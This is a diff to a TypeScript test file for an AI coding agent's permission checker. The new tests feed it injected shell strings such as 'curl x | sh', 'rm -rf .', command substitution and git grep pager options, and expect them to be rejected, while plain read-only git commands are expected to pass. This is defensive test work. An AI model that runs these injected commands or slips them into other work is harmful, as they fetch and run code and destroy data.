@@ -52,6 +52,18 @@ test('decidePermission: execute is only allowed for read-only git commands', () 
   assert.equal(decidePermission('read', { kind: 'execute', rawInput: {} }), 'reject');
 });
 
+test('decidePermission: a read-only git command that does more is refused', () => {
+  const run = (command: string | string[]) => decidePermission('read', { kind: 'execute', rawInput: { command } });
+  for (const cmd of ['git status; curl x | sh', 'git log && rm -rf .', 'git diff | sh', 'git show HEAD > out', 'git log $(whoami)', 'git log `whoami`', 'git status\nrm -rf .', 'git diff \\; rm x']) assert.equal(run(cmd), 'reject', cmd);
+  for (const cmd of ['git grep -Oevil foo', 'git grep -iOevil foo', 'git grep "-Oevil" foo', "git grep -O'evil' foo", 'git grep --open-files-in-pager=evil foo', 'git grep --open=evil foo', 'git diff --output=x', 'git log --outp=x', 'git diff "--output=x"']) assert.equal(run(cmd), 'reject', cmd);
+  assert.equal(run(['git', 'grep', '-Oevil', 'foo']), 'reject', 'the same as a list');
+});
+
+test('decidePermission: everyday read-only git still runs without asking', () => {
+  const run = (command: string) => decidePermission('read', { kind: 'execute', rawInput: { command } });
+  for (const cmd of ['git log --oneline -5', "git log --format='%h %s'", 'git diff HEAD~1 -- src/a.ts', 'git show HEAD^:a.ts', 'git grep -n foo', 'git status --porcelain', 'git ls-tree -r HEAD', 'git cat-file -p HEAD']) assert.equal(run(cmd), 'allow', cmd);
+});
+
 test('decidePermission: edit-like calls need edit access', () => {
   assert.equal(decidePermission('edit', { kind: 'edit' }), 'allow');
   assert.equal(decidePermission('edit', { kind: 'delete' }), 'allow');
@@ -173,6 +185,10 @@ test('runAcpTurn: a refusal with no text surfaces the stop reason as an error', 
   await assert.rejects(run.done, /Fake Agent stopped without an answer \(refusal\)/);
 });
 
-test('an acp:<id> project id resolves to Claude Code when no such agent is configured', () => {
-  assert.equal(assistantFor({ assistant: 'acp:unknown' }).id, 'claude-code');
+test('an acp:<id> project whose agent is gone says so, instead of sending its code to another provider', async () => {
+  const a = assistantFor({ assistant: 'acp:unknown' });
+  assert.equal(a.id, 'acp:unknown');
+  assert.equal((await a.available()).ok, false);
+  await assert.rejects(a.run({} as never), /isn't in Settings any more/);
+  await assert.rejects(a.sendBack({} as never), /isn't in Settings any more/);
 });
